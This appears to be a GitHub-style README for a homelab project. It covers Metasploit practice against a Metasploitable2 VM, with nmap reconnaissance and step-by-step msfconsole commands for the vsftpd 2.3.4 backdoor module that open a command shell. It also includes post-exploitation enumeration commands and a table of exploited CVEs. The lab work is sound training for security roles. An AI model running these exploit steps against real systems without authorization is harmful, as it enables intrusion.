# Metasploit Homelab – Exploitation & Vulnerability Validation

## Overview
This project demonstrates hands-on practice with the Metasploit Framework for vulnerability exploitation and validation in a controlled lab environment.

The goal of this lab is to understand how attackers exploit vulnerabilities and how security teams validate scanner findings using real exploitation techniques.

This project aligns with practical skills required for Vulnerability Management, SOC, and Penetration Testing roles.

---

## Objectives

- Learn how exploitation frameworks work
- Validate vulnerabilities discovered by scanners
- Understand real attack techniques
- Practice post-exploitation enumeration
- Document findings like a security analyst

---

## Lab Environment

| Component | Tool |
|---|---|
| Attacker Machine | Kali Linux |
| Exploitation Framework | Metasploit |
| Vulnerable Machine | Metasploitable2 |
| Virtualization | VirtualBox |

---

## Lab Network Architecture

```
Attacker Machine
(Kali Linux)
      │
      │
Internal Virtual Network
      │
      │
Target Machine
(Metasploitable2)
```

---

## Installation

### Install Metasploit

On Kali Linux:

```bash
sudo msfconsole
```

Verify installation:

```bash
msfconsole --version
```

---

## Vulnerability Discovery

Before exploitation, run reconnaissance.

Example using Nmap:

```bash
nmap -sV <target-ip>
```

Example output:

```
21/tcp  open  ftp       vsftpd 2.3.4
22/tcp  open  ssh       OpenSSH
80/tcp  open  http      Apache
```

---

## Exploitation Example

Example: Exploiting VSFTPD Backdoor

Start Metasploit:

```bash
msfconsole
```

Search for exploit:

```bash
search vsftpd
```

Select exploit module:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Set target:

```bash
set RHOSTS <target-ip>
```

Run exploit:

```bash
exploit
```

Successful result:

```
Command shell session opened
```

---

## Post Exploitation

Basic commands:

```
whoami
uname -a
ifconfig
```

Privilege escalation attempts:

```
searchsploit linux privilege escalation
```

---

## Example Findings

| Vulnerability | CVE | Severity | Status |
|---|---|---|---|
| VSFTPD Backdoor | CVE-2011-2523 | Critical | Exploited |
| Samba Username Map Script | CVE-2007-2447 | Critical | Exploited |
| UnrealIRCd Backdoor | CVE-2010-2075 | Critical | Exploited |

---

## Screenshots

Add screenshots of:

- Metasploit console
- Exploit execution
- Shell access
- Post exploitation commands

Example file structure:

```
/screenshots/exploit-success.png
/screenshots/meterpreter-session.png
```

---

## Key Skills Demonstrated

- Vulnerability validation
- Exploit framework usage
- Network reconnaissance
- Post exploitation enumeration
- Security reporting

---

## How This Helps Vulnerability Management

Security scanners sometimes produce false positives.

Using Metasploit helps analysts:

- Validate if a vulnerability is actually exploitable
- Prioritize critical risks
- Improve remediation accuracy

This is an important skill for tools like Qualys VMDR and Nessus.

---

## Learning Resources

- Metasploit Official Documentation
- Metasploitable2 Vulnerable VM
- OWASP Testing Guide

---

## Disclaimer

This lab was conducted in a controlled environment for educational purposes only.

Do not attempt exploitation on systems without proper authorization.

---

## Future Improvements

- Automating exploitation scripts
- Integrating vulnerability scanners
- Creating a full vulnerability report
- Building a red team attack chain
